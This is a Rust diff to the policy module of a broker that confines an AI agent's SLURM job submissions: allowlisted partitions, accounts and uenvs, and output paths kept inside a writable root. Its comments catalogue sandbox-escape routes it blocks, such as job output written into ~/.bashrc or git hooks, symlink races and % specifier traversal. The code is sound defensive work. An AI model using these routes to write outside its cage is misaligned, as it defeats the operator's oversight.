@@ -1,28 +1,129 @@
 //! All broker policy lives here. Input is hostile. See BROKER.md.
 
 use crate::protocol::{Request, PROTOCOL_VERSION};
+use crate::profile;
 use crate::sbatch;
 use crate::session::Session;
 use crate::settings::{self, FsPolicy};
 
-use husk_slurm_broker::READONLY_SLURM;
+use husk_slurm_broker::{BROKERED_MUTATING, READONLY_SLURM};
 
 pub enum Decision {
     Submit(Submission),
     /// Run a validated read-only query (argv[0] is the command) and return output.
     Query(Vec<String>),
+    /// Cancel these job ids — IF the broker submitted them. The ownership check is
+    /// deliberately NOT here: `decide` is pure, and only the broker knows what it
+    /// submitted. This carries the shape-validated targets and nothing else.
+    Cancel(Vec<String>),
     Reject(String),
 }
 
 pub struct Submission {
     /// sbatch options (forced + sanitized passthrough), NOT including the script.
     pub options: Vec<String>,
-    pub job_args: Vec<String>,
-    /// The script content to stage and submit (snapshot + re-exec guard).
+    /// The script content to submit. Husk-authored in full — see `wrap_script`.
     pub wrapped_script: String,
+    /// The agent's own script, staged separately and executed as DATA inside the cage.
+    pub body: String,
+    /// Where `body` must be written. Named by the guard, inside the confined write root.
+    pub body_path: String,
+    /// Advice to print on a SUCCESSFUL submit, or empty. Goes to the submitter's stderr,
+    /// where real sbatch puts its own warnings, so stdout stays the bare
+    /// `Submitted batch job N` that tooling parses.
+    pub note: String,
 }
 
-pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
+/// Resolve ONE requested token against the operator's set and return **husk's** entry.
+///
+/// The third instance of a shape that was written twice by hand (`--partition`, `--account`)
+/// before `--uenv` made it a class. What is shared is exactly this: the job selects, husk
+/// emits its own copy, and an unlisted request is refused **naming the set** — authorization,
+/// not availability, and identical on retry.
+///
+/// What is deliberately NOT shared is the surrounding policy: partitions and accounts resolve
+/// a single value with a default, `--uenv` resolves a comma-separated list with none. Folding
+/// those differences in would produce a function with three modes, which is how a shared helper
+/// becomes worse than the duplication it replaced.
+fn pick_from_set<'a>(requested: &str, allowed: &'a [String], what: &str) -> Result<&'a str, String> {
+    allowed
+        .iter()
+        .find(|a| a.as_str() == requested)
+        .map(String::as_str)
+        .ok_or_else(|| {
+            format!(
+                "husk was not configured to allow the {what} {requested:?}. This is husk's \
+                 allowlist, not a statement about whether it exists. Allowed here: {}. To add \
+                 one, whoever installed husk edits ~/.husk/config.json.",
+                allowed.join(", ")
+            )
+        })
+}
+
+/// Tell a submission what wall limit it is about to inherit — but only when it did not
+/// choose one, and only from numbers SLURM gave us.
+///
+/// husk forces every job onto one partition, so it moves jobs somewhere with limits their
+/// author never picked. A caged agent's job silently inherited 30 minutes on 2026-08-01
+/// and it only noticed from `squeue` afterwards; at 7 minutes that was harmless, but a
+/// longer run would have died mid-flight with nothing said at submit time.
+///
+/// Deliberately hedged on the QOS: a site QOS can lower the effective limit below the
+/// partition's, and husk cannot see that from here. So this reports what it read, says
+/// where it read it, and gives the action that is right regardless - set `--time`.
+fn time_limit_note(session: &Session, chosen: &str, submission_sets_time: bool) -> String {
+    let Some(limits) = session.limits.get(chosen) else { return String::new() };
+    if submission_sets_time || limits.is_empty() {
+        return String::new();
+    }
+    let p = chosen;
+    let mut s = format!(" This job sets no --time, so it takes partition {p}'s");
+    match (&limits.default_time, &limits.max_time) {
+        (Some(d), Some(m)) => s.push_str(&format!(" default limit of {d} (max {m})")),
+        (Some(d), None) => s.push_str(&format!(" default limit of {d}")),
+        (None, Some(m)) => s.push_str(&format!(" limit, at most {m}")),
+        (None, None) => unreachable!("is_empty() returned false"),
+    }
+    s.push_str(
+        "; a site QOS may lower that. Note this is NOT sinfo's TIMELIMIT column, which \
+         shows the maximum, not what an untimed job gets. Set --time explicitly if the \
+         job needs longer.",
+    );
+    s
+}
+
+/// THE SUBMISSION GATE: turn one request from the caged agent into a decision.
+///
+/// The largest function in the file and, with `wrap_script`, most of its production lines —
+/// and it had no doc comment at all, because `B1-4`'s seven orphaned blocks left both of the
+/// two functions that matter undocumented while their neighbours looked over-documented.
+///
+/// **What it is.** A DEFAULT-DENY construction, not a filter. Nothing the agent sends is
+/// forwarded: husk parses the request, decides each field against the operator's
+/// configuration, and RE-EMITS its own argv — so an option husk does not model cannot reach
+/// `sbatch`, and an option it does model reaches it in husk's spelling and no other. The
+/// order below is load-bearing and each step says why at the point it happens; the shape is:
+///
+///   1. what kind of request is this (submit / query / cancel), and is that verb brokered;
+///   2. is the working directory one husk will bind WRITABLE — asked of the agent's `req.cwd`
+///      AND of husk's own project root, because validating only the value you distrust is
+///      how a home came to be bound writable (F15/F19);
+///   3. parse the CLI and the `#SBATCH` body into one option list, normalising glued short
+///      options first so a glued form cannot slip past the gate (F13/F14);
+///   4. resolve partition / account / uenv against the operator's sets, refusing by
+///      AUTHORIZATION and naming the set (`pick_from_set`);
+///   5. confine `--output`/`--error` to the writable set, by pattern and by leaf;
+///   6. build the cage (`FsPolicy::compute_bwrap_args`) and the guard (`wrap_script`).
+///
+/// A refusal is a `Decision::Reject` carrying the sentence the agent sees. Those sentences
+/// are the interface as much as the argv is: identical on retry, naming what husk allows
+/// rather than what exists, and saying what to do next (`P11`, `P13`).
+pub fn decide(
+    req: &Request,
+    session: &Session,
+    fs: &FsPolicy,
+    project_dir: &std::path::Path,
+) -> Decision {
     if req.version != PROTOCOL_VERSION {
         return Decision::Reject(format!("unsupported protocol version {}", req.version));
     }
@@ -31,25 +132,33 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
     match req.tool.as_str() {
         "sbatch" => {} // fall through to the submission flow
         t if READONLY_SLURM.contains(&t) => {
-            let mut argv = vec![req.tool.clone()];
-            argv.extend(req.argv.iter().cloned());
-            return Decision::Query(argv);
+            match vet_query_argv(t, &req.argv) {
+                Ok(argv) => return Decision::Query(argv),
+                Err(why) => return Decision::Reject(why),
+            }
         }
+        t if BROKERED_MUTATING.contains(&t) => return cancel_decision(&req.argv),
         other => {
             return Decision::Reject(format!(
-                "'{other}' is not brokered (only sbatch and read-only SLURM queries; \
-                 interactive srun/salloc and state-changing commands are disabled)"
+                "'{other}' is not brokered (only sbatch, scancel of this session's own \
+                 jobs, and read-only SLURM queries; interactive srun/salloc and other \
+                 state-changing commands are disabled)"
             ));
         }
     }
 
     // Confine the working directory: it is forced as --chdir and bound WRITABLE into the
-    // compute cage, so reject `/`, homes under HIDDEN_FLOOR, and traversal — otherwise the
-    // job re-mounts root read-write or re-exposes a home inside the cage. (F15/F19)
-    if !settings::is_workdir_allowed(&req.cwd) {
+    // compute cage, so reject `/`, homes under the derived floor, and traversal — otherwise
+    // the job re-mounts root read-write or re-exposes a home inside the cage. (F15/F19)
+    //
+    // `fs.workdir_allowed`, not the ambient `settings::is_workdir_allowed`: the policy knows
+    // which home root this SITE has (`B2-1`) and which roots the operator wrote in
+    // `denyRead`, and the ambient form knows neither.
+    if !fs.workdir_allowed(&req.cwd) {
         return Decision::Reject(format!(
             "Working directory {:?} is not allowed. Submit the job from a scratch/project \
-             directory (an absolute path, not '/' and not under a hidden home like /users).",
+             directory (an absolute path, not '/' and not under a home directory or any \
+             denyRead root).",
             req.cwd
         ));
     }
@@ -57,24 +166,68 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
     // Normalize getopt-glued short options (`-o/path`, `-ppancake`) into separate tokens
     // BEFORE parsing, so a glued form can't slip past the gate (F14) or the strip (F13).
     let cli = sbatch::option_tokens(&sbatch::split_glued_short_opts(&req.argv));
-    let directives = sbatch::sbatch_directives(&req.script.body);
+    let directives = match sbatch::sbatch_directives(&req.script.body) {
+        Ok(d) => d,
+        Err(reason) => return Decision::Reject(format!("#SBATCH: {reason}")),
+    };
 
     // ---- partition: must resolve to the site's forced partition, else reject + teach ----
-    // The required partition is site-specific (HUSK_SLURM_PARTITION, default preemptible);
-    // Balfrin has `preemptible`, Santis does not, so it is not hard-coded.
-    let required = session.required_partition.as_str();
+    // The required partition is site-specific (HUSK_SLURM_PARTITION, default preemptible).
+    // Not every site has a preemptible partition, so it is not hard-coded.
+    let allowed = session.allowed_partitions.as_slice();
     let partition = sbatch::option_value(&cli, &["-p", "--partition"])
         .or_else(|| sbatch::option_value(&directives, &["-p", "--partition"]));
-    match partition.as_deref() {
-        Some(p) if p == required => {}
-        _ => {
+    // Whether the submission chose its own wall clock. Checked across CLI *and* #SBATCH,
+    // like the partition, because a run script's directive counts as the author choosing.
+    let sets_time = sbatch::option_value(&cli, &["-t", "--time"])
+        .or_else(|| sbatch::option_value(&directives, &["-t", "--time"]))
+        .is_some();
+
+    // Resolve the requested partition against the allowed SET, and re-emit OUR entry.
+    //
+    // A list rather than one value because a real cluster is not homogeneous: GPU nodes
+    // and CPU-only postprocessing nodes are different partitions, and which one a job
+    // needs is a hardware fact only the job knows. husk bounds the set; the job picks
+    // from it. Same construct-and-re-emit shape as --chdir: the agent influences the value,
+    // and the bytes that reach sbatch are ours.
+    //
+    // Exactly ONE. `--partition=a,b` is valid sbatch (the scheduler picks), but it would
+    // make the hardware choice implicit again, and the resolved value is what the wall-limit
+    // note describes - so a multi-valued request is refused rather than half-honoured.
+    let chosen = match partition.as_deref() {
+        Some(p) if p.contains(',') => {
             return Decision::Reject(format!(
-                "Only --partition={required} is permitted here. Resubmit with \
-                 --partition={required}. It is the partition all brokered jobs run on \
-                 (typically preemptible/low-priority, so checkpoint your work)."
+                "husk needs exactly one partition, not {p:?}. Pick the one this job's \
+                 hardware needs and resubmit with --partition=<name>. Allowed here: {}.",
+                allowed.join(", ")
             ));
         }
-    }
+        // Re-emit the ALLOWLIST entry, never the request's bytes.
+        Some(p) => match allowed.iter().find(|a| a.as_str() == p) {
+            Some(entry) => entry.clone(),
+            None => return Decision::Reject(partition_refusal(allowed, session, sets_time)),
+        },
+        None => return Decision::Reject(partition_refusal(allowed, session, sets_time)),
+    };
+    let time_note = time_limit_note(session, &chosen, sets_time);
+    // Filled in below if husk picked the billing account rather than the submission doing so.
+    let mut account_note = String::new();
+
+    // ---- topology: pick the cage profile, and force it rather than infer it ----
+    // Checked across CLI *and* #SBATCH, like the partition. The reason is NOT that a body
+    // directive would reach slurmd — it would not, and has not since Fix 1; husk submits its
+    // own script on stdin. It is that husk itself reads both channels and re-emits from
+    // both, so a `--nodes` husk fails to notice in the body is one it fails to VALIDATE.
+    // `--nodes` is Forced in the registry, so the agent's own token never survives to the
+    // real command line either way. The profile then EMITS `--nodes=1` below, which is what
+    // makes the single-node cage true by construction — reading the request is not enough,
+    // since `--ntasks N` alone lets the scheduler spread tasks over nodes.
+    let requested_nodes = sbatch::option_value(&cli, &["-N", "--nodes"])
+        .or_else(|| sbatch::option_value(&directives, &["-N", "--nodes"]));
+    let profile = match profile::Profile::select(requested_nodes.as_deref()) {
+        Ok(p) => p,
+        Err(reason) => return Decision::Reject(reason),
+    };
 
     // ---- uenv: inherited from the launching session; the agent may NOT choose it ----
     // The broker forces --uenv/--view from the trusted session (below) and never uses
@@ -102,8 +255,66 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
         (Some(_), None) => true,
         _ => false,
     };
-    if overrides(agent_sel(&["--uenv"], "SBATCH_UENV"), session.uenv.as_ref())
-        || overrides(agent_sel(&["--view"], "SBATCH_UENV_VIEW"), session.view.as_ref())
+    // ---- the operator's uenv SET: the job may select from it, by label ----
+    //
+    // Only reached when the operator configured one. With an empty set nothing changes: the
+    // session's uenv is inherited or nothing is, exactly as before, which is what keeps every
+    // existing install behaving identically.
+    //
+    // husk emits NO MOUNT POINT. uenv takes each image's mount from its own metadata when none
+    // is given, so the images land where their authors intended — the compatible answer, and
+    // the one where the job never chooses a filesystem location. Two images wanting the same
+    // mount is uenv's error, with uenv's message.
+    let agent_uenv = agent_sel(&["--uenv"], "SBATCH_UENV");
+    let mut chosen_uenv: Option<String> = None;
+    let mut chosen_view: Option<String> = None;
+    if !session.allowed_uenvs.is_empty() {
+        if let Some(req) = agent_uenv.as_deref() {
+            // A comma-separated LIST, because `--uenv` is one: a workflow legitimately wants a
+            // compiler stack and a tools stack at once. Every element is resolved separately
+            // and re-emitted from the allowlist, so the bytes that reach sbatch are ours.
+            let mut picked: Vec<String> = Vec::new();
+            for elem in req.split(',') {
+                let elem = elem.trim();
+                // A mount point here would be the job choosing where an image lands. Refuse
+                // rather than strip: silently dropping half of what someone wrote is how a
+                // person ends up debugging a mount that never happened.
+                // A mount point is a colon followed by a PATH, not any colon: `icon/25.2:v3`
+                // is a label with a TAG. uenv's own lexer draws the line exactly there.
+                //
+                // This check exists for the MESSAGE, not for safety — an element carrying a
+                // mount point cannot match an allowlist entry anyway, so exact matching
+                // already refuses it. Without this the operator would be told "not
+                // configured" and go looking in the wrong place.
+                if elem.contains(":/") || elem.contains(":.") {
+                    return Decision::Reject(format!(
+                        "husk sets uenv mount points itself, so {elem:?} may not carry one. \
+                         Name the image alone and it mounts where its metadata says."
+                    ));
+                }
+                match pick_from_set(elem, &session.allowed_uenvs, "uenv") {
+                    Ok(entry) => picked.push(entry.to_string()),
+                    Err(why) => return Decision::Reject(why),
+                }
+            }
+            chosen_uenv = Some(picked.join(","));
+            // The view is the job's to choose (views differ in HOW software is loaded, not in
+            // WHAT the image holds), so this is the first agent-supplied value in the family
+            // and `v_view` is the boundary on it.
+            if let Some(v) = agent_sel(&["--view"], "SBATCH_UENV_VIEW") {
+                if !sbatch::v_view(&v) {
+                    return Decision::Reject(format!(
+                        "the --view value {v:?} is not a uenv view name. Expected \
+                         `[uenv:]view-name`, comma-separated for several."
+                    ));
+                }
+                chosen_view = Some(v);
+            }
+        }
+    }
+    if chosen_uenv.is_none()
+        && (overrides(agent_sel(&["--uenv"], "SBATCH_UENV"), session.uenv.as_ref())
+            || overrides(agent_sel(&["--view"], "SBATCH_UENV_VIEW"), session.view.as_ref()))
     {
         return Decision::Reject(format!(
             "uenv is inherited from the launching session and cannot be changed by the job. \
@@ -127,8 +338,83 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
 
     // ---- forced options (these outrank any #SBATCH directive: CLI > directive) ----
     let mut options: Vec<String> = Vec::new();
-    options.push(format!("--partition={required}"));
-    if let Some(u) = &session.uenv {
+    options.push(format!("--partition={chosen}"));
+    // The billing account, where the site uses one. Forced from the operator's trusted
+    // config for the same two reasons as the partition: it decides WHO IS BILLED, so an
+    // agent-chosen value could charge another project's allocation; and on sites whose
+    // cli_filter requires it (Santis) no job runs without one.
+    // Resolve the requested account against the allowed SET and re-emit OUR entry, exactly
+    // as the partition is resolved above. The agent influences the value; the bytes that
+    // reach sbatch are ours, so the set is the boundary and the request is only a selector.
+    let requested_account = pick_any(&cli, &directives, &["-A", "--account"]);
+    if !session.allowed_accounts.is_empty() {
+        let allowed = session.allowed_accounts.as_slice();
+        let chosen_acct = match requested_account.as_deref() {
+            // `--account=a,b` is not valid sbatch anyway, but say so in husk's own words
+            // rather than letting the site answer with something less specific.
+            Some(a) if a.contains(',') => {
+                return Decision::Reject(format!(
+                    "husk needs exactly one account, not {a:?}. Pick the project this job \
+                     should bill and resubmit with --account=<name>. Allowed here: {}.",
+                    allowed.join(", ")
+                ))
+            }
+            Some(a) => match allowed.iter().find(|x| x.as_str() == a) {
+                Some(entry) => entry.clone(),
+                // AUTHORIZATION, not availability, and identical on retry: the account may
+                // well exist and the user may well have hours on it — husk simply was not
+                // told about it. Name who changes that and how, or the reader concludes the
+                // cluster is broken and goes looking in the wrong place.
+                None => {
+                    return Decision::Reject(format!(
+                        "husk was not configured to bill {a:?}. This is husk's allowlist, not \
+                         a statement about whether that account exists or whether you have \
+                         hours on it. Allowed here: {}. To add one, whoever installed husk \
+                         edits `~/.husk/config.json` under `accounts`.",
+                        allowed.join(", ")
+                    ))
+                }
+            },
+            // No request: bill the operator's default, and SAY SO. Silently picking one of
+            // several is the case where a user later finds the wrong project charged.
+            None => allowed[0].clone(),
+        };
+        // Announce a defaulted account, but only when the choice was real. With one
+        // configured account there is nothing to have chosen and the line would be noise —
+        // and a banner that says something on every job is one nobody reads (`P13`).
+        if requested_account.is_none() && allowed.len() > 1 {
+            account_note = format!(
+                "husk: no --account given, so this job bills {chosen_acct} (the first of {}). \
+                 Pass --account=<name> to bill a different one.",
+                allowed.join(", ")
+            );
+        }
+        options.push(format!("--account={chosen_acct}"));
+    } else if requested_account.is_some() {
+        // The agent asked for an account and husk has none to force. Dropping it silently
+        // would loop: the site refuses the job for want of an account, the agent reads that
+        // message, supplies one, husk drops it again. Say who has to fix it and how.
+        return Decision::Reject(
+            "husk sets --account itself, from the operator's configuration, so the one in \
+             this request was not used — and none is configured here. If this cluster \
+             requires a project account, ask whoever installed husk to add it to \
+             `~/.husk/config.json` under `accounts`. It is operator config on purpose: the \
+             account decides which project is billed."
+                .to_string(),
+        );
+    }
+    // The cage profile's own forced options (today: --nodes=1). Emitted with the other
+    // forced values, before the validated passthrough, so they outrank any #SBATCH.
+    options.extend(profile.forced_sbatch_options());
+    if let Some(u) = chosen_uenv.as_ref() {
+        // The job selected from the operator's set. Emitted without a mount point on purpose;
+        // the view is either the job's (validated above) or absent, in which case uenv applies
+        // each image's default view.
+        options.push(format!("--uenv={u}"));
+        if let Some(v) = chosen_view.as_ref() {
+            options.push(format!("--view={v}"));
+        }
+    } else if let Some(u) = &session.uenv {
         options.push(format!("--uenv={u}"));
         // Force a NORMALIZED `--view` (uenvname:viewname). Raw UENV_VIEW is mount-qualified
         // (e.g. `/user-environment:icon:default`) and invalid as a `--view` argument;
@@ -148,11 +434,168 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
     // credentials + `--unshare-net`s the job. (AV7 caveat: env secrets NOT listed in
     // credentials.envVars still reach the caged, network-off job — widen that list to mask.)
     options.push("--export=ALL".to_string());
-    // req.cwd is validated non-empty/absolute/confined above (is_workdir_allowed).
+    // ---- chdir / output / error: the job MAY choose, CONFINED to the workdir subtree ----
+    //
+    // These stay forced BY CONSTRUCTION — husk always emits its own value on the real
+    // command line, which outranks any `#SBATCH` — but the value may now come from the
+    // request. Real run scripts depend on it: ICON writes
+    // `#SBATCH --output=<case>/run/LOG.<exp>.%j.o` and expects its logs there, and every
+    // HPC workflow built around finding files by name was broken by a forced
+    // `slurm-%j.out`.
+    //
+    // Why this is safe, and why it needed care. `--output`/`--error` name a file that
+    // *slurmd* writes AS THE USER and OUTSIDE the cage, so an unconfined value is an
+    // uncaged arbitrary-write primitive (job stdout into ~/.bashrc, or a .git/hooks file:
+    // AV2 with the cage bypassed). `--chdir` names a directory the job starts in.
+    // Confining both to the workdir subtree grants nothing new — that subtree is already
+    // bound writable into the cage — while letting the workflow put its files where it
+    // wants them. The CAGE IS UNCHANGED by this: the writable bind is still `cwd`.
+    //
+    // Read from the CLI first, then the body, exactly like --partition: the agent's own
+    // token is dropped by the registry (both remain `Class::Forced`), so the string below
+    // is one husk validated and re-emitted, never one forwarded into slurmd's parser.
+    // THE CAGE'S WRITABLE ROOT IS THE TRUSTED PROJECT DIR, not the agent's cwd.
+    //
+    // `req.cwd` arrives from the agent over the spool. Deriving the write boundary from it
+    // let the confined side choose its own confinement: `cd run && sbatch x` produced a
+    // cage one directory narrower than `sbatch run/x`, with nothing anywhere saying so —
+    // a production ICON run died 22 times on EROFS and the only difference was the shell's
+    // cwd at submit time (field report, 2026-07-31). F17 already established that the
+    // POLICY must come from the trusted dir; this completes it for the WRITE ROOT.
+    //
+    // The job still STARTS where the agent was (`--chdir` defaults to req.cwd below), so
+    // relative paths behave as they would uncaged. Only the boundary moved, and it moved
+    // to something the agent cannot influence and the human chose by launching husk there.
+    let root = project_dir.to_string_lossy().to_string();
+
+    // ...and the root is checked TOO, not just the agent's cwd.
+    //
+    // This is the value bound read-WRITE into every job. `is_workdir_allowed` has always
+    // existed and has always rejected exactly this, but it was only ever applied to
+    // `req.cwd` — so husk validated the value it distrusted and took its own on faith.
+    // Launch husk from a home and every brokered job got that home bound writable, through
+    // the `--tmpfs /users` floor that exists to hide it: `~/.ssh` readable, `~/.bashrc`
+    // writable, and `~/.husk/log/job-*.log` — the audit trail put there BECAUSE the home is
+    // masked — writable by the job it records.
+    //
+    // Refuse at the top, before `root` reaches anything else. Cheaper than unpicking which
+    // downstream check happens to catch it, and it stops the writable-set message from
+    // announcing a home as writable on its way out.
+    if !fs.workdir_allowed(&root) {
+        return Decision::Reject(format!(
+            "husk will not run a job whose working directory is {root:?}: that is a home \
+             directory (or the filesystem root), and husk binds the directory it was \
+             launched from into the job read-write. Launch husk from a scratch or project \
+             path instead — e.g. $SCRATCH/my-run — and submit from there."
+        ));
+    }
+
     let cwd = req.cwd.clone();
-    options.push(format!("--chdir={cwd}"));
-    options.push(format!("--output={cwd}/slurm-%j.out"));
-    options.push(format!("--error={cwd}/slurm-%j.err"));
+    let pick = |names: &[&str]| {
+        sbatch::option_value(&cli, names).or_else(|| sbatch::option_value(&directives, names))
+    };
+
+    // What this job may write: the trusted project dir, plus every configured allowWrite
+    // root. Built HERE because --chdir is confined to it, not merely announced from it.
+    let mut writable = vec![root.clone()];
+    writable.extend(fs.allow_write().iter().cloned());
+
+    // --chdir, whether the request set one or it defaults to req.cwd, must land inside that
+    // set. The default case used to pass `cwd` through UNCHECKED, and `--output`/`--error`
+    // are confined RELATIVE TO IT — so an agent that put any path outside /users in req.cwd
+    // (it writes the spool; the value is adversary-controlled) had slurmd create files there
+    // as the user and outside the cage. Confining to an agent-chosen base is not
+    // confinement. Found 2026-08-01 while building the selftest arm for exactly this case.
+    //
+    // `RA-6`/`P11`: WHERE the working directory came from is decided ONCE, here, and every
+    // refusal below uses that answer. The `%` refusal added with the round-3 fix re-derived
+    // it and got it wrong: it said `--chdir:` to an agent that had passed no `--chdir`, and
+    // quoted the RESOLVED path, which for a symlinked cwd is a string the agent never
+    // typed. An unattributed denial invites confident wrong remediation; a MISattributed
+    // one invites it faster, because it names an option to go and edit.
+    let (chdir_from, chdir_given) = match pick(&["-D", "--chdir"]) {
+        None => ("the directory this job was submitted from", cwd.clone()),
+        Some(d) => ("--chdir", d),
+    };
+    let chdir = match settings::confine_under_any(&chdir_given, &writable) {
+        Ok(p) => p,
+        Err(why) => return Decision::Reject(format!("{chdir_from}: {why}")),
+    };
+    // D2-7: a `%` in the WORKING DIRECTORY is a `%` in a directory component of the
+    // pattern husk EMITS, and slurmd expands specifiers across the whole pattern, not just
+    // the leaf. `--chdir=<root>/%x` with `--job-name=..` therefore has slurmd open
+    // `<root>/../slurm-<id>.out` - one level above the writable root per `%x` component,
+    // unbounded by nesting, written as the user outside the cage. The run-time guard does
+    // not see it either: it resolves the UNEXPANDED directory, which is a real directory
+    // inside the set.
+    //
+    // `confine_output_pattern` has refused exactly this since A1 ("puts a SLURM % specifier
+    // in a DIRECTORY component") - but only for a path the AGENT supplied. The default
+    // below was `format!`ed straight into the option list and never met that check. `P9`,
+    // and the second time this function has produced its shape: the check covered one of
+    // the two ways the value is produced.
+    //
+    // Refused HERE, on --chdir, rather than left to the check below, because the refusal
+    // must name the thing the agent can change (`P11`): the leaf is husk's own
+    // `slurm-%j.out`, and blaming it would send the agent renaming a file it never chose.
+    //
+    // Fail-closed regardless of an open hardware question: whether slurmd expands `%` in
+    // DIRECTORY components as well as in the leaf is unconfirmed off-cluster. husk's own
+    // `settings.rs` check exists for no other reason, so the gap follows from husk's own
+    // premise; and if the answer turns out to be "no", this refusal costs a job whose
+    // working directory has a `%` in its name and nothing else.
+    if chdir.contains('%') {
+        // Name the value the agent typed AND the one husk resolved, when they differ: a
+        // symlinked cwd makes "{chdir:?} contains a `%`" a claim about a path the agent has
+        // never seen, and a refusal it cannot connect to its own input is one it retries.
+        let via =
+            if chdir == chdir_given { String::new() } else { format!(" (reached from {chdir_given:?})") };
+        let advice = if chdir_from == "--chdir" {
+            "Pass a --chdir whose path contains no `%`."
+        } else {
+            "Submit from a directory whose path contains no `%`."
+        };
+        return Decision::Reject(format!(
+            "{chdir_from}: the working directory husk would give this job contains a SLURM \
+             `%` specifier: {chdir:?}{via}. husk builds --output/--error under the job's \
+             working directory, and SLURM expands `%` across the WHOLE pattern - directory \
+             components included - after husk has confined it. A `%` here would let a value \
+             husk cannot resolve decide where SLURM writes, as you and outside the sandbox. \
+             {advice}"
+        ));
+    }
+    // Output paths are resolved against the JOB's working directory, which is what a
+    // relative `--output=logs/x.out` means to SLURM.
+    //
+    // The DEFAULT goes through the same function as an agent-supplied value. It is not a
+    // trusted string just because husk typed it: every component to its left came from
+    // `--chdir`, which came from the request.
+    let out_given = pick(&["-o", "--output"]).unwrap_or_else(|| "slurm-%j.out".to_string());
+    let err_given = pick(&["-e", "--error"]).unwrap_or_else(|| "slurm-%j.err".to_string());
+    let out = match settings::confine_output_pattern(&out_given, &chdir) {
+        Ok(p) => p,
+        Err(why) => return Decision::Reject(format!("--output: {why}")),
+    };
+    let err = match settings::confine_output_pattern(&err_given, &chdir) {
+        Ok(p) => p,
+        Err(why) => return Decision::Reject(format!("--error: {why}")),
+    };
+    options.push(format!("--chdir={chdir}"));
+    options.push(format!("--output={out}"));
+    options.push(format!("--error={err}"));
+    // APPEND, never truncate — the first half of A1's run-time defence (`P3`).
+    //
+    // The submit-time leaf check refuses a path that is a symlink NOW; it cannot refuse one
+    // that becomes a symlink while the job sits PENDING, and husk cannot make slurmd open
+    // with O_NOFOLLOW. Under the default `truncate` that race destroys the target's contents
+    // before a line of husk's runs. `append` leaves nothing to destroy, and the fd guard
+    // below then refuses the body, so the only bytes that can reach a swapped-in target are
+    // husk's own refusal text — content injection needs the body.
+    //
+    // Cost: two runs writing the same literal output filename accumulate rather than
+    // overwrite. Every husk default is `%j`-unique, so only a job that names a fixed file
+    // and runs twice can see it.
+    options.push("--open-mode=append".to_string());
 
     // ---- resource options: ALLOWLIST, not passthrough ----
     // Interpret the agent's CLI against the option registry: Forced/Ignored options
@@ -163,23 +606,788 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
     // and unknown/next-year options fail closed by construction, not open. This retires
     // the whole F13/F14/F24/F26/F27 class rather than the instances. See THREAT-MODEL.md
     // "Design principle (the gate)".
-    match sbatch::interpret_cli(&cli) {
-        Ok(resource_opts) => options.extend(resource_opts),
+    // …from BOTH channels, because a real run script puts them in the BODY.
+    //
+    // This used to interpret the CLI only. Body `#SBATCH` lines were parsed (that is how
+    // an unknown or Forced directive gets rejected by name) and then their resource
+    // options were DROPPED — validated as acceptable and never re-emitted. The comment on
+    // `wrap_script` claimed the opposite: "husk already parses them, validates them, and
+    // re-emits what it allows onto the command line". It re-emitted only what came from
+    // the CLI.
+    //
+    // The cost was a production outage and it was silent, which is the worst shape: the
+    // job RAN, with SLURM's defaults. A script saying `#SBATCH --ntasks=64` got one task —
+    // 2 CPUs of a 256-CPU node — while `SLURM_NTASKS` came back empty and nothing anywhere
+    // said husk had dropped anything. The agent that hit it reasonably concluded husk was
+    // capping CPUs. Every real HPC run script uses directives, so this was the normal path,
+    // not an edge case (P7, P12).
+    //
+    // Precedence is sbatch's own: CLI > env > `#SBATCH`. So interpret the directives first
+    // and let CLI entries override them by option name — which also keeps husk's forced
+    // options winning, since those are emitted separately above and `interpret_cli` drops
+    // Forced/Ignored from both channels.
+    let body_opts = match sbatch::interpret_cli(&directives) {
+        Ok(o) => o,
+        Err(reason) => return Decision::Reject(format!("#SBATCH: {reason}")),
+    };
+    let cli_opts = match sbatch::interpret_cli(&cli) {
+        Ok(o) => o,
         Err(reason) => return Decision::Reject(reason),
+    };
+    let name_of = |o: &String| o.split_once('=').map(|(n, _)| n.to_string()).unwrap_or_else(|| o.clone());
+    let overridden: Vec<String> = cli_opts.iter().map(name_of).collect();
+    options.extend(body_opts.into_iter().filter(|o| !overridden.contains(&name_of(o))));
+    options.extend(cli_opts);
+
+    // `RA-2`, and this is the second half of the admission rule in `OUTPUT_SPECIFIERS`.
+    // A specifier is safe to accept only when husk can name the file SLURM opens, and for
+    // `%A`/`%a` that is true only when SLURM was told to run an array. MEASURED on Santis
+    // 2026-08-31, a non-array batch job: `--output=probe-A%A-a%a-s%s.log` produced
+    // `probe-A837636-a4294967294-sbatch.log` while `SLURM_ARRAY_JOB_ID`/`SLURM_ARRAY_TASK_ID`
+    // were unset, so the guard computed `probe-A-a-sbatch.log` and BOTH leaf checks - the
+    // symlink one and `N1`'s hard-link one - ran on a name that does not exist. The job id
+    // comes back from `sbatch`, so the real leaf needs no guessing; that is A1-F1 re-armed
+    // through a specifier husk documents as allowed.
+    //
+    // Refused rather than modelled, deliberately. Expanding `%a` to `4294967294` would put a
+    // SLURM INTERNAL CONSTANT, measured once on one of two clusters, into generated shell
+    // that no test in this repo can notice going stale - while husk refuses `%J` on exactly
+    // the ground that a guard-side expansion must not guess another program's rendering.
+    //
+    // `RA2-1`, and the reason this loop sits HERE rather than beside `confine_output_pattern`
+    // where it was written: it must read THE OPTION LIST HUSK IS ABOUT TO SUBMIT, never the
+    // agent's tokens. It used to ask `pick`, i.e. `sbatch::option_value`, which walks the
+    // token vector and takes `tokens[i+1]` after any `-a` - with no idea whether `tokens[i]`
+    // is an option or another option's VALUE. `interpret_cli`, which builds what husk
+    // actually submits, does know. So the two readers disagreed on four tokens:
+    //
+    //     sbatch --job-name -a --output=probe-A%A.log job.sh
+    //
+    // `option_value` saw `-a` and reported an array; `interpret_cli` ate it as
+    // `--job-name=-a` and emitted no `--array` at all. The submission carried `%A` on a
+    // job SLURM never ran as an array - `P15` reached through the check that exists to
+    // prevent exactly that divergence, and the run-time guard left as the only defence.
+    //
+    // Asking `options` is not a stricter version of the same question, it is a DIFFERENT
+    // question with no gap in it: `options` is the byte-for-byte argv `run_sbatch` passes,
+    // so "the option this check read" and "the option SLURM receives" are the same object
